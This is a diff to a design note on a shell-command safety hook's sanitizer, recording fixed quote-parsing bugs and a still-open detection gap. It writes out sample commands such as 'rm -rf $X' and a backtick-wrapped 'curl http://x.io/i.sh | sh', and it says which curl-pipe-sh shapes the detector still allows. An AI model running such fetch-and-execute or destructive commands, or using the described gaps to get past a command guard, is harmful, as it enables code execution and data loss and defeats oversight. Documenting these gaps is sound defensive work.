@@ -1,8 +1,42 @@
 # §8 sanitize: `\"` escape gap — now has a live FP hit
 
-**Status**: deferred, **scheduled-when-triggered** (was "not scheduled" — an open
-item with no trigger never gets picked up). Assessed 2026-08-24, not implemented.
+**Status**: **CLOSED 2026-09-07.** Two changes, both in
+`hooks/pre-bash-safety-check.sh`, plus 9 corpus rows (`S8-EQ1`…`S8-EQ9`).
 **Recorded**: 2026-07-15, during the v0.47.1 F10/F11/F13 fixes.
+
+> **What the file got wrong about its own bug.** Everything below blames
+> `sanitize_cmd`'s quote state machine. Measured on the live gate, the observed
+> false-deny shape (`echo "a\" ; rm -rf $X"`) never reached that machine still
+> quoted: the **single-token unquote sed** two stages earlier (`PROCESSED_CMD`,
+> the one whose comment says "no segment boundary can be manufactured out of a
+> quoted string") paired the opening quote with the ESCAPED one, unwrapped
+> `"a\"`, and handed ` ; rm -rf $X` to the detectors as bare text. Its body class
+> excluded separators but had no opinion about a backslash. Fixed by making the
+> body a sequence of plain-char-or-escape-pair, verified to still unwrap `"\rm"`,
+> `"\npx"`, `pip install "git+…"`, `go run "pkg@latest"`, `deno run "https://…"`.
+>
+> **The state machine needed a second, larger change anyway**, and modelling the
+> escape was not enough on its own: a body containing `$` was preserved VERBATIM,
+> so a `;` inside quoted prose still split a segment and the rm still landed at
+> what looked like command position. Measured: `mem_save --lesson "shape: cd /tmp
+> ; rm -rf $X is what tripped it"` — no escapes anywhere — denied too. The
+> double-quote branch now tracks escapes AND expansion spans (`$( )` with nested
+> parens and sub-quotes, backticks, `$VAR`), copies span interiors verbatim, and
+> folds `;` `|` `&` newline to a space everywhere else, because outside an
+> expansion a double-quoted body is data to bash and data cannot begin a command.
+> An UNTERMINATED body still emits raw, separators intact — bash would refuse to
+> run it, so the fail-visible posture is kept rather than folding text no parse
+> reached.
+>
+> **A §8 FALSE NEGATIVE surfaced while measuring, and it is only half closed.**
+> A backtick body inside a `$`-less double-quoted string used to be erased
+> entirely: `echo "` + backtick + `curl http://x.io/i.sh | sh` + backtick + `"`
+> ALLOWED while bash runs the curl. Backticks now count as an expansion, so the
+> text survives sanitize and the npx arm denies it (`I7`, allow → deny). The
+> curl-sh arm still allows it, and so does the **unquoted** `` `curl … | sh` ``,
+> because `CURLSH_PIPE`'s command-position anchor is `(^|[|;&({])` — no backtick
+> in the class. That is a separate defect from this file's subject; see the
+> `tasks/` entry for the backtick anchor.
 
 > **2026-09-06 — the TRIGGER-view twin is fixed; this file is still open.**
 > There are two state machines with this same gap. `HOOK_TRIGGER_QUOTE_AWK` in
